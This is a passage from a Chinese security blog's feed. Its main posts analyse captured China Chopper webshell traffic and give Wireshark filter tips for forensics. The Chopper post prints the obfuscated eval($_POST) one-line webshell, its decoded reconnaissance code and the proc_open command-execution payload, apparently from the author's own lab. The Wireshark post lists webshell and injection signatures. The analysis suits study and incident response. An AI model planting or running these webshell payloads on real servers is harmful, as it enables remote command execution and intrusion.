class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191108082153536.png" alt="image-20191108082153536"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输出：</span><br><span class="line"><span class="number">12</span>-&gt;十进制转二进制为: <span class="number">1100</span></span><br><span class="line"><span class="number">15</span>-&gt;十进制转八进制: <span class="number">17</span></span><br><span class="line"><span class="number">10</span>-&gt;十进制转<span class="number">16</span>进制: a</span><br><span class="line"><span class="number">1100</span>-&gt;二进制转十六进制为: <span class="number">31313030</span></span><br><span class="line"><span class="number">1100</span>-&gt;二进制转十六进制为: <span class="number">12</span></span><br><span class="line"><span class="number">17</span>-&gt;八进制转十进制: <span class="number">15</span></span><br><span class="line">aaa-&gt;十六进制转十进制: <span class="number">2730</span></span><br><span class="line"><span class="number">520</span>-&gt;十进制转十六进制: <span class="number">208</span></span><br><span class="line">aaa-&gt;十六进制转十进制: <span class="number">2730</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191108082117989.png" alt="image-20191108082117989"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>base_convert()</code> 会用它就完事了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;  不管是SQL注入，还是CTF的web题，都有涉及16进制转换，所以特此学习以下&lt;/p&gt;
&lt;figure class=&quot;highlight</summary>
      
    
    
    
    <category term="PHP" scheme="http://www.ywboy.cn/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>中国菜刀原理分析</title>
    <link href="http://www.ywboy.cn/2020/10/03/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>http://www.ywboy.cn/2020/10/03/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</id>
    <published>2020-10-03T07:07:09.000Z</published>
    <updated>2020-10-03T08:19:35.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="中国菜刀-分析"><a href="#中国菜刀-分析" class="headerlink" title="中国菜刀-分析"></a>中国菜刀-分析</h2><p>以下是刚连接时，发送的POST请求</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191110092147844.png" alt="image-20191110092147844"></p><p>首先进行三次握手，然后POST请求了<code>tao.php</code>这个木马文件，我这里密码是a，然后我查看访问<code>tao.php</code>的POST请求数据，在数据中发现如下代码</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191110093246938.png" alt="image-20191110093246938"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=$xx=chr(<span class="number">98</span>).chr(<span class="number">97</span>).chr(<span class="number">115</span>).chr(<span class="number">101</span>).chr(<span class="number">54</span>).chr(<span class="number">52</span>).chr(<span class="number">95</span>).chr(<span class="number">100</span>).chr(<span class="number">101</span>).chr(<span class="number">99</span>).chr(<span class="number">111</span>).chr(<span class="number">100</span>).chr(<span class="number">101</span>);$yy=$_POST;@<span class="keyword">eval</span><span class="comment">/**/</span>.($xx<span class="comment">/**/</span>.($yy[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKF9fRklMRV9fKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br><span class="line"><span class="comment"># 注： %3D-&gt;url解密-&gt;=</span></span><br></pre></td></tr></table></figure><p>其中<code>a=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);</code>这一串，转码为<code>base64_decode</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191110093636205.png" alt="image-20191110093636205"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKF9fRklMRV9fKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure><p>上面这段base64加密的解码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);@set_magic_quotes_runtime(<span class="number">0</span>);<span class="keyword">echo</span>(<span class="string">&quot;-&gt;|&quot;</span>);;$D=dirname(<span class="keyword">__FILE__</span>);$R=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>\t&quot;</span>;<span class="keyword">if</span>(substr($D,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;<span class="keyword">foreach</span>(range(<span class="string">&quot;A&quot;</span>,<span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> $L)<span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))$R.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;&#125;$R.=<span class="string">&quot;\t&quot;</span>;$u=(function_exists(<span class="string">&#x27;posix_getegid&#x27;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&#x27;&#x27;</span>;$usr=($u)?$u[<span class="string">&#x27;name&#x27;</span>]:@get_current_user();$R.=php_uname();$R.=<span class="string">&quot;(<span class="subst">&#123;$usr&#125;</span>)&quot;</span>;<span class="keyword">print</span> $R;;<span class="keyword">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>我们将整个代码进行整理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xx = base64_decode;</span><br><span class="line">$yy = $_POST;</span><br><span class="line">z0 = @ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>); <span class="comment"># 临时关闭PHP的错误显示功能</span></span><br><span class="line">@set_time_limit(<span class="number">0</span>); <span class="comment"># 防止像dir、上传文件大马时超时</span></span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>); <span class="comment"># 关闭魔术引号 这东西在4.0以后就不怎么用了</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;-&gt;|&quot;</span>);;</span><br><span class="line">$D=dirname(<span class="keyword">__FILE__</span>);</span><br><span class="line">$R=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>\t&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(substr($D,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(range(<span class="string">&quot;A&quot;</span>,<span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> $L)</span><br><span class="line">    <span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))</span><br><span class="line">        $R.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$R.=<span class="string">&quot;\t&quot;</span>;</span><br><span class="line">$u=(function_exists(<span class="string">&#x27;posix_getegid&#x27;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&#x27;&#x27;</span>;$usr=($u)?$u[<span class="string">&#x27;name&#x27;</span>]:@get_current_user();</span><br><span class="line">$R.=php_uname();</span><br><span class="line">$R.=<span class="string">&quot;(<span class="subst">&#123;$usr&#125;</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> $R;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">@<span class="keyword">eval</span>(base64_decode($_POST[z0]))</span><br><span class="line"><span class="comment"># 以下是会显信息</span></span><br><span class="line">    z1 = C:\\phpStudy\\PHPTutorial\\WWW\\   <span class="comment"># 解码后的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 上述代码 待研究</span></span><br></pre></td></tr></table></figure><p>注: 我重新连接，重新抓包的时候，发现z1不是回显了，而是之前请求</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191110101705399.png" alt="image-20191110101705399"></p><p>以下我发现，文件管理中,分为两个参数<code>z0</code>,<code>z1</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191110102133133.png" alt="image-20191110102133133"></p><p>我在其中还删除了几个文件，<code>QzpcXHBocFN0dWR5XFxQSFBUdXRvcmlhbFxcV1dXXFxpbmRleC5waHA=</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191110102103773.png" alt="image-20191110102103773"></p><p>以上都是使用<code>文件管理</code>功能</p><p>而我的下一步操作就是，使用菜刀连接了<code>虚拟终端</code>，发现了一个新参数<code>z2</code>,但是其中<code>z1</code>是更为明显的象征，其中z0的值也发生了改变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">z0 = </span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;-&gt;|&quot;</span>);;</span><br><span class="line">$m=get_magic_quotes_gpc();</span><br><span class="line">$p=base64_decode($m?stripslashes($_POST[<span class="string">&quot;z1&quot;</span>]):$_POST[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line">$s=base64_decode($m?stripslashes($_POST[<span class="string">&quot;z2&quot;</span>]):$_POST[<span class="string">&quot;z2&quot;</span>]);</span><br><span class="line">$d=dirname($_SERVER[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"> <span class="comment"># dirname() 函数返回路径中的目录部分</span></span><br><span class="line"> <span class="comment"># $_SERVER[&quot;SCRIPT_FILENAME&quot;] 当前执行脚本的绝对路径</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果在命令行界面（Command Line Interface, CLI）使用相对路径执行脚本，例如 file.php 或 ../file.php，那么 $_SERVER[&#x27;SCRIPT_FILENAME&#x27;] 将包含用户指定的相对路径。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$c=substr($d,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;$r=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment"># substr() 函数返回字符串的一部分</span></span><br><span class="line"></span><br><span class="line">$array=<span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>));</span><br><span class="line">$fp=proc_open($r.<span class="string">&quot; 2&gt;&amp;1&quot;</span>,$array,$pipes);</span><br><span class="line">$ret=stream_get_contents($pipes[<span class="number">1</span>]);</span><br><span class="line">proc_close($fp);</span><br><span class="line"><span class="keyword">print</span> $ret;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);<span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y21k -&gt;  cmd</span><br><span class="line">Y2QgL2QgQzpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXCZuZXRzdGF0IC1hbiB8IGZpbmQgIkVTVEFCTElTSEVEIiZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==     -&gt;  cd /d C:\phpStudy\PHPTutorial\WWW\&amp;netstat -an | find <span class="string">&quot;ESTABLISHED&quot;</span>&amp;<span class="keyword">echo</span> [S]&amp;cd&amp;<span class="keyword">echo</span> [E]</span><br></pre></td></tr></table></figure><p>没错，我第一条执行的命令就是他连接默认的第一条命令</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191110102613149.png" alt="image-20191110102613149"></p><p>再往下看，我发现，虚拟终端执行的每一条命令，<code>z1=cmd</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>文件管理<ul><li>key : 连接一句话木马  value: 解码为base64_decode</li><li>z0  -&gt;  木马核心代码</li><li>z1 -&gt;   目录信息</li></ul></li><li>虚拟终端<ul><li>key : 连接一句话木马  value: 解码为base64_decode</li><li>z0 -&gt; 木马核心代码</li><li>z1 -&gt; cmd (windows) 或者 /bin/sh (Linux)</li><li>z2 -&gt; 执行的命令</li></ul></li></ul><p>有些函数没见过，有时间再更新…</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://blog.ernket.top/2019/10/02/zhong-guo-cai-dao-fen-xi/">http://blog.ernket.top/2019/10/02/zhong-guo-cai-dao-fen-xi/</a> </li><li><a href="https://www.cnblogs.com/milantgh/p/4285735.html">https://www.cnblogs.com/milantgh/p/4285735.html</a> </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;中国菜刀-分析&quot;&gt;&lt;a href=&quot;#中国菜刀-分析&quot; class=&quot;headerlink&quot; title=&quot;中国菜刀-分析&quot;&gt;&lt;/a&gt;中国菜刀-分析&lt;/h2&gt;&lt;p&gt;以下是刚连接时，发送的POST请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.c</summary>
      
    
    
    
    <category term="web安全" scheme="http://www.ywboy.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="常用工具" scheme="http://www.ywboy.cn/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Wireshark 实用小技巧</title>
    <link href="http://www.ywboy.cn/2020/10/03/Wireshark%20%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://www.ywboy.cn/2020/10/03/Wireshark%20%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
    <published>2020-10-03T06:58:39.000Z</published>
    <updated>2020-10-03T08:19:11.841Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wireshark实用小技巧"><a href="#Wireshark实用小技巧" class="headerlink" title="Wireshark实用小技巧"></a>Wireshark实用小技巧</h1><p>由于比赛数据包一般都比较大，先通过脚本进行下流量清洗会有事半功倍的效果（感觉上kali下wireshark命令行工具tshark以及TCPdump效率更高，因为是命令行的原因，反而更有利于减少干扰，保持专注)。<br> 以下为几点注意事项：<br>     1、wireshark过滤DHCP时直接输入dhcp会报错，应输入bootp<br>     2、利用过滤http，导出http，保存成相应文件。</p><p>​     3、urldecode解码，解码后z0部分base64解码，PHP代码在线格式化（输入头&lt;?php 点击格式化即可）<br>​     4、一般先url解码，再载base64解码<br>​     5、攻击行为特征</p><ul><li>大量404                       目录扫描</li><li>select … from     等关键词 sql注入</li><li>POST请求            用户名和密码——爆破</li><li>/../../..                  测试文件包含 </li><li>echo等                 命令执行</li><li>http、POST、”@eval“        一句话木马特征</li><li>内网环境，因此攻击者一般为外网ip，被攻击者为内网</li><li>最后一条login信息，中提交的用户名密码，且下一次访问换了目录，一般为攻击者成功破解并登录 </li><li>关键字<ul><li>过滤多个关键字：ip.addr == 攻击者IP and http.request.uri matches “edit|upload|login| modify “</li><li>文件修改关键字：edit/upload/modify</li><li>登录关键字: admin/login/manage</li></ul></li><li>菜刀<ul><li>查看菜刀连接地址在上一层传输层 </li><li>ctrl+shift+n追踪到下一条 </li><li><strong>注：如果是明文说明是下载文件；base64编码则是读取文件内容</strong></li></ul></li></ul><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>过滤语句：<code>ftp-data or ftp</code></p><table><thead><tr><th>追踪流显示</th><th>意义</th></tr></thead><tbody><tr><td>STOR</td><td>上传命令</td></tr><tr><td>DELE</td><td>删除</td></tr><tr><td>CWD</td><td>请求目录</td></tr><tr><td>LIST</td><td>列出目录内容</td></tr></tbody></table><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-01.png" alt="image-01.png"></p><h2 id="应急响应浅析"><a href="#应急响应浅析" class="headerlink" title="应急响应浅析"></a>应急响应浅析</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><table><thead><tr><th>名称</th><th>描述</th><th>工具来源</th></tr></thead><tbody><tr><td>cmd</td><td>命令模式</td><td>win自带</td></tr><tr><td>net</td><td>网络管理命令</td><td>win自带</td></tr><tr><td>netstat</td><td>网络连接状态命令</td><td>win自带</td></tr><tr><td>ipconfig</td><td>ip状态参数</td><td>win自带</td></tr><tr><td>regedit</td><td>注册表编辑器</td><td>win自带</td></tr><tr><td>secpol.msc</td><td>本地安全策略</td><td>win自带</td></tr><tr><td>gpedit.msc</td><td>本地安全组策略</td><td>win自带</td></tr><tr><td>lusrmgr.msc</td><td>用户管理器</td><td>win自带</td></tr><tr><td>eventvwr.msc</td><td>事件查看器</td><td>win自带</td></tr><tr><td>msinfo32</td><td>系统信息</td><td>win自带</td></tr><tr><td>services.msc</td><td>服务列表</td><td>win自带</td></tr><tr><td>at</td><td>计划任务</td><td>win自带</td></tr><tr><td>systeminfo</td><td>系统信息</td><td>win自带</td></tr><tr><td>md5sum</td><td>md5校验和检测</td><td>GNU Windows tool</td></tr><tr><td>fport</td><td>进程对应端口显示</td><td>Foundstone, inc</td></tr><tr><td>Psfile</td><td>列举打开文件系统</td><td>Sysintemals</td></tr><tr><td>Pskill</td><td>杀进程命令</td><td>Sysintemals</td></tr><tr><td>sc</td><td>服务列举工具</td><td>资源工具箱</td></tr></tbody></table><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><table><thead><tr><th>名称</th><th>描述</th><th>来源</th></tr></thead><tbody><tr><td>ps</td><td>查看系统进程</td><td>/usr/bin/ps</td></tr><tr><td>ls</td><td>查看目录，文件列表</td><td>/usr/bin/ls</td></tr><tr><td>df</td><td>查看磁盘空间使用情况</td><td>/usr/bin/df</td></tr><tr><td>netstat</td><td>查看网络连接/端口状态</td><td>/usr/bin/netstat</td></tr><tr><td>find</td><td>查找文件</td><td>/usr/bin/find</td></tr><tr><td>more</td><td>分页显示输出信息</td><td>/usr/bin/more</td></tr><tr><td>chkrootkit</td><td>检测常见的rootkit</td><td>sunfreeware</td></tr><tr><td>lsof</td><td>检测文件和进程/端口关联</td><td>sunfreeware</td></tr><tr><td>md5</td><td>文件校验和</td><td>sunfreeware</td></tr><tr><td>nc</td><td>网络工具</td><td>sunfreeware</td></tr><tr><td>tcpdump</td><td>sniffer</td><td>自行下载</td></tr><tr><td>nmap</td><td>端口扫描</td><td>自行下载</td></tr><tr><td>john</td><td>检测口令强度</td><td>自行下载</td></tr></tbody></table><h2 id="wireshark-过滤规则"><a href="#wireshark-过滤规则" class="headerlink" title="wireshark 过滤规则"></a>wireshark 过滤规则</h2><h4 id="过滤MAC地址"><a href="#过滤MAC地址" class="headerlink" title="过滤MAC地址"></a>过滤MAC地址</h4><table><thead><tr><th>过滤语句</th><th>解释</th></tr></thead><tbody><tr><td>eth.addr == 00:00:00:00:00:00</td><td>过滤目标或源地址是00:00:00:00:00:00</td></tr><tr><td>eth.src == 00:00:00:00:00:00</td><td>过滤源MAC地址是00:00:00:00:00:00</td></tr><tr><td>eth.dst == 00:00:00:00:00:00</td><td>过滤目标MAC地址是00:00:00:00:00:00</td></tr></tbody></table><h4 id="过滤IP"><a href="#过滤IP" class="headerlink" title="过滤IP"></a>过滤IP</h4><table><thead><tr><th>过滤语句</th><th>解释</th></tr></thead><tbody><tr><td>ip.src == 192.168.1.1</td><td>源地址为192.168.1.1</td></tr><tr><td>ip.src eq 192.168.1.1</td><td>源地址为192.168.1.1</td></tr><tr><td>ip.dst == 192.168.1.1</td><td>目标地址为192.168.1.1</td></tr><tr><td>ip.dst eq 192.168.1.1</td><td>目标地址为192.168.1.1</td></tr><tr><td>ip.addr == 192.168.1.1</td><td>ip地址过滤，不论源还是目标</td></tr><tr><td>ip.addr eq 192.168.1.1</td><td>ip地址过滤，不论源还是目标</td></tr></tbody></table><h4 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h4><table><thead><tr><th>过滤语句</th><th>解释</th></tr></thead><tbody><tr><td>tcp.port == 80</td><td>过滤tcp端口80</td></tr><tr><td>udp.port eq 80</td><td>过滤udp端口80</td></tr><tr><td>tcp.srcport == 80</td><td>tcp协议的来源端口是80</td></tr><tr><td>tcp.dstport == 80</td><td>tcp协议的目标端口是80</td></tr><tr><td>tcp.port &gt;=1 and tcp.port &lt;= 80</td><td>端口范围过滤: 1&lt;= tcp协议端口 &lt;=80</td></tr></tbody></table><h4 id="常见协议过滤"><a href="#常见协议过滤" class="headerlink" title="常见协议过滤"></a>常见协议过滤</h4><table><thead><tr><th>过滤协议</th></tr></thead><tbody><tr><td>tcp</td></tr><tr><td>udp</td></tr><tr><td>arp</td></tr><tr><td>icmp</td></tr><tr><td>http</td></tr><tr><td>smtp</td></tr><tr><td>ftp</td></tr><tr><td>dns</td></tr><tr><td>msnms</td></tr><tr><td>ip</td></tr><tr><td>ssl</td></tr><tr><td>telnet</td></tr><tr><td>oicq</td></tr><tr><td>bootp</td></tr><tr><td>…</td></tr><tr><td>排除协议包: !arp  或者 not arp</td></tr></tbody></table><h4 id="http模式过滤"><a href="#http模式过滤" class="headerlink" title="http模式过滤"></a>http模式过滤</h4><table><thead><tr><th>过滤语句</th><th>解释</th></tr></thead><tbody><tr><td>http.request.method == “GET”</td><td>只显示GET请求</td></tr><tr><td>http.request.method == “POST”</td><td>只显示POST请求</td></tr><tr><td>http.request.uri == “/login.php”</td><td>显示请求URL中有login.php</td></tr><tr><td>http contains “GET”</td><td></td></tr><tr><td>http contains “HTTP/1.1”</td><td></td></tr></tbody></table><h5 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h5><table><thead><tr><th>过滤语句</th></tr></thead><tbody><tr><td>请求头（GET）</td></tr><tr><td>http.request.method == “GET” &amp;&amp; http contains “Host:”</td></tr><tr><td>http.request.method == “GET” &amp;&amp; http contains “User-Agent:”</td></tr><tr><td>请求头（POST）</td></tr><tr><td>http.request.method == “POST” &amp;&amp; http contains “Host:”</td></tr><tr><td>http.request.method == “POST” &amp;&amp; http contains “User-Agent:”</td></tr><tr><td>响应包</td></tr><tr><td>http contains “HTTP/1.1 200 OK” &amp;&amp; http contains “Content-Type:”</td></tr><tr><td>http contains “HTTP/1.0 200 OK” &amp;&amp; http contains “Content-Type:”</td></tr></tbody></table><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><table><thead><tr><th>原意</th><th>简写</th><th>解释</th></tr></thead><tbody><tr><td>less than</td><td>lt</td><td>小于</td></tr><tr><td>less and qeual</td><td>le</td><td>小于等于</td></tr><tr><td>equal</td><td>eq</td><td>等于</td></tr><tr><td>great then</td><td>gt</td><td>大于</td></tr><tr><td>great and equal</td><td>ge</td><td>大于等于</td></tr><tr><td>not equal</td><td>ne</td><td>不等于</td></tr></tbody></table><h4 id="TCP过滤"><a href="#TCP过滤" class="headerlink" title="TCP过滤"></a>TCP过滤</h4><table><thead><tr><th>过滤语句</th><th>解释</th></tr></thead><tbody><tr><td>tcp.flags</td><td>显示包含TCP标志的封包</td></tr><tr><td>tcp.flags.syn == 0x02</td><td>显示包含TCP SYN标志的封包</td></tr><tr><td>tcp.window_size == 0 &amp;&amp; tcp.flags.reset != 1</td><td></td></tr><tr><td>tcp.flags.reset == 1</td><td>RST/ACK 数据包</td></tr></tbody></table><blockquote><p> 注: 以上为 显示过滤器 </p></blockquote><p>最后，附上一张wireshark思维导图</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/wiresharkt.png" alt="wiresharkt.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/y7u8t6/article/details/86511338">https://blog.csdn.net/y7u8t6/article/details/86511338</a> </li><li><a href="https://www.jianshu.com/p/63f6f7d5deed">https://www.jianshu.com/p/63f6f7d5deed</a> </li><li><a href="https://www.jianshu.com/p/bbd2ffe57aeb">https://www.jianshu.com/p/bbd2ffe57aeb</a> </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Wireshark实用小技巧&quot;&gt;&lt;a href=&quot;#Wireshark实用小技巧&quot; class=&quot;headerlink&quot; title=&quot;Wireshark实用小技巧&quot;&gt;&lt;/a&gt;Wireshark实用小技巧&lt;/h1&gt;&lt;p&gt;由于比赛数据包一般都比较大，先通过脚本进行下</summary>
      
    
    
    
    <category term="网络安全" scheme="http://www.ywboy.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Wireshark" scheme="http://www.ywboy.cn/tags/Wireshark/"/>
    
    <category term="常用工具" scheme="http://www.ywboy.cn/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>南邮CTF-CG Web题writeup详解</title>
    <link href="http://www.ywboy.cn/2020/09/26/%E5%8D%97%E9%82%AECTF-CG%20Web%E9%A2%98writeup%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.ywboy.cn/2020/09/26/%E5%8D%97%E9%82%AECTF-CG%20Web%E9%A2%98writeup%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-09-26T07:02:59.000Z</published>
    <updated>2020-10-03T08:13:32.786Z</updated>
    
